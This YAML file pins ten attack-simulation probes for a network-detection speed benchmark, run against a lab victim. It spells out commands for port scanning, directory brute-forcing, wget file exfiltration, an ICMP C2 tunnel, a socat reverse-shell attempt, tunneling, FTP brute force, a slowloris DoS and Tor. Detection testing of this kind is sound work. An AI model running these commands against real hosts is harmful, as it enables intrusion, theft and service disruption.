# probes-perf10.yaml — pinned 10-probe ART pool for the speed-test benchmark.
#
# DO NOT EDIT the entries here to track probes.yaml. This pool is intentionally
# frozen so that benchmark runs remain comparable over time. If probes.yaml
# evolves, this file should only be updated as part of an explicit "new
# benchmark baseline" decision (and a fresh baseline.json should be captured).
#
# The 10 probes span 10 distinct MITRE techniques and exercise different
# detection surfaces (Suricata alerts, Zeek weird, TLS JA3, HTTP UA, etc.).
# Order is intentional: the speed-test runner instructs the agent to execute
# them in the order listed below.
#
# Entries are copied verbatim from probes.yaml as of this checkpoint.

probes:

  # 1. Scanning — Suricata stream/flow SYN burst.
  - name: art-masscan-syn-burst
    category: scanning
    mitre: T1046
    source: atomic-red-team
    art_test: "T1046 (masscan)"
    rationale: "masscan fast SYN scan — 1000pps burst, timing distinct from nmap"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      # masscan rate limit 1000pps — noticeably faster than nmap default.
      # Targets victim's known listening ports; sensor should see SYN burst on conn.log.
      timeout 20 sudo masscan {{VICTIM_IP}} -p 22,80,443,445,3389,8080,8081,8443 \
        --rate 1000 --wait 0 2>&1 | tail -10 || true

  # 2. Reconnaissance — HTTP UA + 404 burst vs DVWA.
  - name: art-gobuster-dvwa-dir-enum
    category: scanning
    mitre: T1595.003
    source: atomic-red-team
    art_test: "T1595.003 (gobuster)"
    rationale: "gobuster directory brute-force against DVWA :8081 — rapid 404 burst + UA"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      # DVWA on :8081 (from victim_setup.sh) gives gobuster a real directory tree
      # to enumerate vs. nginx's single-endpoint response. Produces ~4400 GETs/UA.
      timeout 30 gobuster dir -u "http://{{VICTIM_IP}}:8081" \
        -w /usr/share/wordlists/dirb/common.txt -q -t 10 --no-color \
        --timeout 3s 2>&1 | tail -15 || true

  # 3. Exfiltration (unencrypted HTTPS POST) — TLS JA3 + SNI.
  - name: art-wget-post-https-exfil
    category: exfil
    mitre: T1048.002
    source: atomic-red-team
    art_test: "T1048.002 #3"
    rationale: "wget --post-file HTTPS exfil — distinctive Wget JA3 + TLS POST body"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      # wget exfil of /etc/hostname over HTTPS to victim's :8443 listener.
      # Generates Wget-specific JA3 + TLS client fingerprint (not browser JA3).
      timeout 5 wget --post-file=/etc/hostname --timeout=5 --no-check-certificate \
        "https://{{VICTIM_IP}}:8443/" -O /dev/null 2>&1 | head -10 || true
      echo "wget HTTPS exfil completed"

  # 4. Command & Control (non-standard protocol) — ICMP tunnel.
  - name: art-icmpdoor-c2
    category: c2-icmp
    mitre: T1095
    source: atomic-red-team
    art_test: "T1095 #4"
    rationale: "icmpdoor full ICMP C2 tunnel — sustained bidirectional echo payloads (ART T1095 #4)"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      # icmpdoor binary pre-installed at /opt/icmpdoor/ via attacker_setup.sh.
      # Needs sudo (raw sockets); timeout prevents hang since icmp-cnc isn't running.
      timeout 8 sudo /opt/icmpdoor/icmpdoor --interface eth0 --destination_ip {{VICTIM_IP}} 2>&1 | head -10 || true
      echo "icmpdoor sent — expect sustained bidirectional ICMP to victim"

  # 5. Execution (reverse shell) — TLS JA3 fingerprint.
  - name: art-socat-tls-reverse-shell
    category: c2-raw
    mitre: T1059.004
    source: atomic-red-team
    art_test: "T1059.004 (socat TLS)"
    rationale: "socat TLS reverse-shell connect — distinct JA3 vs. nc baseline"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      # socat TLS outbound to uncommon port — generates TLS handshake with
      # socat-specific JA3 fingerprint (not browser, not nc, not curl).
      timeout 5 bash -c 'echo "id" | socat - OPENSSL-CONNECT:{{VICTIM_IP}}:4444,verify=0' 2>&1 | head -5 || true
      echo "socat TLS reverse shell attempt completed"

  # 6. Lateral Movement (tunneling) — ephemeral cert + SNI.
  - name: art-cloudflared-tunnel
    category: tunneling
    mitre: T1572
    source: atomic-red-team
    art_test: "T1572 #7"
    rationale: "cloudflared ephemeral tunnel — TLS SNI *.trycloudflare.com"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      # Ephemeral tunnel attempt — generates TLS to *.trycloudflare.com.
      # Exits quickly without a real local service; 10s cap prevents hang.
      timeout 10 cloudflared tunnel --url http://localhost:80 2>&1 | tail -10 || true
      echo "cloudflared tunnel attempt completed — expect SNI *.trycloudflare.com"

  # 7. Exfiltration (SaaS cloud) — UA + S3 SNI.
  - name: art-rclone-s3-sni
    category: exfil-saas
    mitre: T1567.002
    source: atomic-red-team
    art_test: "T1567.002 #2"
    rationale: "rclone UA + AWS S3 SNI — cloud exfil fingerprint"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      # Generate rclone User-Agent + S3 SNI handshake (known exfil pattern).
      # Real rclone config requires creds; curl replay is sufficient for UA+SNI signal.
      curl -sS --max-time 3 -A 'rclone/v1.69.3' \
        "https://fake-atomic-test.s3.us-east-1.amazonaws.com/" -o /dev/null 2>&1 || true
      echo "rclone-style S3 exfil SNI sent"

  # 8. Credential Access (brute force) — FTP auth failure burst.
  - name: art-hydra-ftp-brute
    category: bruteforce
    mitre: T1110.001
    source: atomic-red-team
    art_test: "T1110.001"
    rationale: "FTP password brute vs vsftpd :21 — exercises new anonymous listener auth path"
    expected_sids: []
    expected_verdict: DETECTED
    already_in_catalog: false
    command: |
      # Small wordlists to stay under 30s; anonymous is enabled so user=anonymous
      # might succeed, but 'admin' / 'root' with common passwords exercises the
      # brute-force signal path (ET 2002383 / Zeek ftp.log PASS failures).
      printf 'admin\nroot\nftp\nanonymous\n'  > /tmp/art-ftp-users.txt
      printf 'password\n123456\nadmin\nftp\n' > /tmp/art-ftp-pass.txt
      timeout 30 hydra -L /tmp/art-ftp-users.txt -P /tmp/art-ftp-pass.txt \
        -t 4 "ftp://{{VICTIM_IP}}" 2>&1 | tail -10 || true
      rm -f /tmp/art-ftp-users.txt /tmp/art-ftp-pass.txt

  # 9. Impact (DoS) — long-lived HTTP connections.
  - name: art-slowhttptest-slowloris
    category: dos
    mitre: T1499.002
    source: atomic-red-team
    art_test: "T1499.002 (community — no ART atomic)"
    rationale: "Slowloris slow-headers DoS vs nginx :80 — ET POLICY Slowloris"
    expected_sids: []
    expected_verdict: DETECTED
    already_in_catalog: false
    command: |
      # Slowloris: 500 half-open HTTP connections held with slow header delivery.
      # Held 30s to generate measurable signal without full service impact.
      timeout 45 slowhttptest -c 500 -H -i 10 -r 200 -t GET \
        -u "http://{{VICTIM_IP}}/" -x 24 -p 3 -l 30 2>&1 | tail -10 || true

  # 10. Defense Evasion (anonymity proxy) — Tor DA SNI + ET intel.
  - name: art-tor-bootstrap
    category: tunneling
    mitre: T1090.003
    source: atomic-red-team
    art_test: "T1090.003 #3"
    rationale: "Tor client bootstrap — directory-authority TLS, ET TOR reputation hits"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      # Foreground tor with root-owned temp data dir. Without `sudo mktemp`
      # the directory ends up owned by the invoking user and tor refuses it
      # with "data directory is not owned by this user" before any network
      # traffic is generated — hence the sudo below (fixes prior run bug).
      TORDIR=$(sudo mktemp -d /tmp/art-tor-XXXXXX)
      timeout 15 sudo tor --DataDirectory "$TORDIR" --SocksPort 9051 --Log 'notice stderr' 2>&1 | head -15 || true
      sudo rm -rf "$TORDIR" 2>/dev/null || true
      echo "tor bootstrap completed — expect ET TOR on DA IPs"
